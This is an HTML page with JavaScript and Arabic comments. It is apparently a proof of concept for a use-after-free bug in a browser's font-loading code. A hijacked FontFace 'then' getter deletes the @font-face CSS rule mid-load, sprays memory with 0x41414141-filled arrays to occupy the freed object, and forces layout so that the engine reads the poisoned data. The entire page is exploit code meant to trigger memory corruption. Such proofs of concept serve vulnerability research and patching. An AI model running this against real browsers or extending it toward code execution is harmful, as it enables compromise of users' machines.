<!DOCTYPE html>
<html>
<head>
<style id="s">
@font-face { font-family: 'targetFont'; src: url(nonexistent.woff); unicode-range: U+0042; }
</style>
</head>
<body style="background: black;">

<script>
window.onload = () => {
    let A = new FontFace('targetFont', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    void A.loaded;

    let callbackCount = 0;
    
    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get() {
            if (this === A) {
                callbackCount++;
                
                if (callbackCount === 1) { 
                    // 1. تدمير الكائن
                    document.getElementById('s').sheet.deleteRule(0);
                    
                    // 2. محاولة ملء الفراغ فوراً ببيانات ضخمة ومكثفة لإحداث تعارض عالي
                    let poison = [];
                    for (let i = 0; i < 500; i++) {
                        // استخدام أحجام مختلفة لمحاولة إغراق قطاع الذاكرة المحرر
                        poison.push(new Uint32Array(0x1000).fill(0x41414141)); 
                    }
                    
                    // 3. إجبار المحرك على القراءة الفورية
                    document.body.offsetTop;
                    
                    // إذا كان الكود أعمى ولا يرى الثغرة، ستصبح الشاشة خضراء.
                    // إذا كانت الثغرة شغالّة 100%، الـ offsetTop سيحاول قراءة البيانات المسمومة (0x41414141) كعنوان وينهار فوراً.
                    document.body.style.background = "green";
                }
            }
            return undefined;
        }
    });

    document.fonts.load('1em targetFont', 'AB');
};
</script>
</body>
</html>
